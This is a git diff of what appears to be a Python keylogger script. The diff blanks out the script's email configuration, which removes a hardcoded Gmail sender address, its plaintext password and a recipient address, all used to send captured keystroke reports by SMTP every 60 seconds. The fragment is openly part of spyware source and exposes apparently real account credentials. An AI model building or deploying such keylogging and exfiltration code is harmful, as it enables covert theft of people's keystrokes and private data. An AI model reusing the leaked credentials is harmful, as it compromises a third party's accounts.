@@ -3,14 +3,15 @@ import smtplib
 from threading import Timer
 from datetime import datetime
 from getpass import getuser
+
 # from webbrowser import open as wbopen
 # from base64 import b64decode
 # from base64 import b64encode
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "zeacersoftware5641@gmail.com"
-EMAIL_PASSWORD = r"CCTU%e*pZvfHFpyYz^a7kfrtn"
-SEND_EMAIL = r"zeacer9955@gmail.com"
+SEND_REPORT_EVERY = 60
+EMAIL_ADDRESS = ""
+EMAIL_PASSWORD = r""
+SEND_EMAIL = r""
 
 
 class Keylogger:
